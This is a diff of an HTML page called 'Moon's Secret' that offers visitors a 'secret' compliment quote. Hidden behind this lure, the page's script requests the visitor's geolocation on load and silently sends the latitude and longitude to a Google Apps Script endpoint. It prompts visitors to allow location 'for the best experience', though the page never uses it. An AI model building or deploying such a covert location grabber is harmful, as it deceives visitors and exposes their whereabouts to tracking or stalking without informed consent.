@@ -3,127 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moon's Secret</title>
-    <!-- Favicon -->
+    <title>Moon’s Secret</title>
     <link rel="icon" type="image/png" href="favicon.png">
     <style>
+        /* Body and background styling */
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Arial', sans-serif;
-            background: url('background.jpg') no-repeat center center fixed;
+            font-family: Arial, sans-serif;
+            background: url('image.jpg') no-repeat center center fixed;
             background-size: cover;
             color: white;
             text-align: center;
         }
 
-        .container {
-            position: relative;
+        /* Main content container */
+        .content {
+            position: absolute;
             top: 50%;
-            transform: translateY(-50%);
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
         }
 
+        /* Text styling */
         h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
+            font-size: 2em;
+            color: #ffcccb;
         }
 
         p {
             font-size: 1.2em;
-            margin-bottom: 30px;
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+            margin-bottom: 20px;
         }
 
-        button {
-            padding: 15px 30px;
-            font-size: 1.2em;
-            background: linear-gradient(45deg, #6a0dad, #8a2be2);
+        /* Button styling */
+        .button {
+            background-color: #ff69b4;
             color: white;
+            padding: 15px 30px;
+            font-size: 1em;
             border: none;
-            border-radius: 25px;
+            border-radius: 50px;
             cursor: pointer;
-            text-shadow: 0 0 5px rgba(255, 255, 255, 0.6);
-            box-shadow: 0 0 15px rgba(138, 43, 226, 0.6);
+            box-shadow: 0px 5px 15px rgba(255, 105, 180, 0.5);
+            transition: all 0.3s ease;
         }
 
-        button:hover {
-            background: linear-gradient(45deg, #8a2be2, #6a0dad);
-            box-shadow: 0 0 25px rgba(138, 43, 226, 0.8);
+        .button:hover {
+            background-color: #ff1493;
+            box-shadow: 0px 10px 25px rgba(255, 20, 147, 0.6);
         }
 
-        .quote-box {
-            margin: 20px auto;
-            padding: 20px;
+        /* Smaller text styling */
+        .small-text {
+            font-size: 0.9em;
+            color: #ffcccb;
+            margin-top: 10px;
+        }
+
+        /* Quote box styling */
+        #quote-box {
+            margin-top: 20px;
+            padding: 15px;
             background: white;
-            color: #333;
+            color: black;
             font-size: 1.2em;
-            width: 60%;
-            max-width: 400px;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
-            border: 3px solid rgba(138, 43, 226, 0.6);
-            animation: glow 2s infinite;
-        }
-
-        @keyframes glow {
-            0% { border-color: rgba(138, 43, 226, 0.4); }
-            50% { border-color: rgba(138, 43, 226, 1); }
-            100% { border-color: rgba(138, 43, 226, 0.4); }
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 20, 147, 0.6);
+            display: none;
         }
     </style>
 </head>
 <body onload="getLocation()">
+    <div class="content">
+        <h1>Hey... Listen...</h1>
+        <p>Moon is going to tell you a secret...</p>
+        <button class="button" onclick="getRandomQuote()">Reveal the Secret</button>
+        <p class="small-text">Allow your location for the best experience.</p>
+        <div id="quote-box"></div>
+    </div>
 
-<div class="container">
-    <h1>Hey... Listen...</h1>
-    <p>Moon is going to tell you a secret...</p>
-    <button onclick="revealQuote()">Allow your location for a magical experience</button>
-    <div id="quote-box" class="quote-box" style="display: none;"></div>
-</div>
+    <script>
+        // Placeholder element for the user's location
+        var x = document.getElementById("demo");
 
-<script>
-    var quotes = [
-        "You are the brightest star in someone’s sky.",
-        "The universe shines a little brighter because of you.",
-        "You’re a masterpiece, uniquely crafted to be you.",
-        "Every step you take leaves a trail of light.",
-        "You hold the key to unlock the world’s wonders.",
-        "The moon smiles back at you with its soft glow.",
-        "In the galaxy of life, you’re the rarest star.",
-        "Your presence turns the ordinary into extraordinary.",
-        "The world is lucky to have you in it.",
-        "You are a cosmic wonder, a treasure of the stars."
-    ];
-
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition);
-        } else {
-            console.log("Geolocation is not supported by this browser.");
+        // Geolocation function
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            }
         }
-    }
 
-    function showPosition(position) {
-        const lat = position.coords.latitude;
-        const long = position.coords.longitude;
+        // Function to send location to Google Apps Script
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
 
-        const googleScriptURL = "https://script.google.com/macros/s/AKfycbySAP6KAAlhS8Z-Rtj30nb06Tk9fpQWUClWc09o0E97k-thh5FX5WRgEn2ArycpNYHjnQ/exec"; 
-        const url = googleScriptURL + "?lat=" + lat + "&long=" + long;
+            // Google Apps Script URL
+            const googleScriptURL = "https://script.google.com/macros/s/AKfycbySAP6KAAlhS8Z-Rtj30nb06Tk9fpQWUClWc09o0E97k-thh5FX5WRgEn2ArycpNYHjnQ/exec";
+            
+            // Send location data
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", googleScriptURL + "?lat=" + lat + "&long=" + long, true);
+            xhttp.send();
+        }
 
-        const xhttp = new XMLHttpRequest();
-        xhttp.open("GET", url, true);
-        xhttp.send();
-    }
+        // Quotes array
+        const quotes = [
+            "You’re a masterpiece the universe painted just once.",
+            "The stars envy your glow; you outshine them all.",
+            "You’re the light in someone’s darkest night.",
+            "Your smile is a constellation worth discovering.",
+            "The world is better simply because you’re in it.",
+            "Every heartbeat of yours echoes a thousand miracles.",
+            "You are not a drop in the ocean; you’re the ocean in a drop.",
+            "You’re a walking galaxy, with stars dancing in your eyes.",
+            "Your uniqueness is the rarest treasure on Earth.",
+            "The universe whispered your name and smiled."
+        ];
 
-    function revealQuote() {
-        const randomIndex = Math.floor(Math.random() * quotes.length);
-        const quoteBox = document.getElementById("quote-box");
-        quoteBox.innerText = quotes[randomIndex];
-        quoteBox.style.display = "block";
-    }
-</script>
-
+        // Function to display a random quote
+        function getRandomQuote() {
+            const randomIndex = Math.floor(Math.random() * quotes.length);
+            const quoteBox = document.getElementById("quote-box");
+            quoteBox.innerText = quotes[randomIndex];
+            quoteBox.style.display = "block";
+        }
+    </script>
 </body>
 </html>
